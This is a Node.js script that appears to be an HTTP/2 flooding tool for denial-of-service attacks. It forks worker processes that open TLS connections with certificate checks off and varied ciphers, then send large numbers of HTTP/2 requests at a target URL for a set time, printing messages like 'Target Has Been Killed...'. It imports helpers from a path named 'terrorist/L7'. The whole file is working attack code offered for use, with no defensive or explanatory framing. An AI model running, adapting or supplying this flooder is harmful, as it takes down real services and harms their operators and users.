const cluster = require("cluster");
const tls = require("tls");
const http2 = require("http2");

const { generateHeaders, generateRecipes } = require("/workspaces/terrorist/L7/generator.js");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

function runKiller() {
    const parsedUrl = args.url;
    const recipes = generateRecipes()

    const addr = {
        host: parsedUrl.hostname,
        port: parsedUrl.port || 443
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ['h2', 'http/1.1', 'spdy/3.1', 'http/1.2', 'http/2'],
        ciphers: recipes.cipher,
        ecdhCurve: "prime256v1:X25519",
        host: addr.host,
        rejectUnauthorized: false,
        servername: addr.host,
        secureProtocol: "TLS_method",
    };

    const tlsSocket = tls.connect(addr.port, addr.host, tlsOptions);

    tlsSocket.setKeepAlive(true, 60000);

    const client = http2.connect(parsedUrl.href, {
        protocol: "https:",
        settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 10000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        },
        maxSessionMemory: 64000,
        maxDeflateDynamicTableSize: 4294967295,
        createConnection: () => tlsSocket,
        socket: tlsSocket,
    });

    setInterval(() => {
        client.on("connect", () => {
            const headers = generateHeaders();

            const dynHeaders = {
                ...headers,
            };

            for (let i = 0; i < args.rpc; i++) {
                const request = client.request(dynHeaders)

                request.on("response", function(response) {
                    // console.log("Response:", response);
                    // request.close();
                    // request.destroy();
                    // return;
                });

                // request.end();
            }
        });
    });

    client.on("error", function() {
        client.destroy();
        tlsSocket.destroy();
        return;
    });

    client.on("close", function () {
        client.destroy();
        tlsSocket.destroy();
        return;
    });

    tlsSocket.on("timeout", function () { tlsSocket.destroy(); return; });
    tlsSocket.on("error", function () { tlsSocket.destroy(); return; });
}

//Main function to start workers
function main() {
    if (cluster.isMaster) {
        console.log("Killing...");

        for (let x = 0; x < args.threads; x++) {
            cluster.fork();
        }
        console.log("Forking All Cluster Done...")

        setTimeout(function () {
            console.log("Target Has Been Killed...");
            process.exit(0);
        }, args.time * 1000);
    } else {
        setInterval(runKiller);
    }
}

//Start Execution
if (process.argv.length < 6) {
    console.log(`Usage: node <url> <rpc> <threads> <time>`);
    process.exit();
}

const args = {
    url: new URL(process.argv[2]),
    rpc: parseInt(process.argv[3]),
    threads: parseInt(process.argv[4]),
    time: parseInt(process.argv[5]),
};

main()
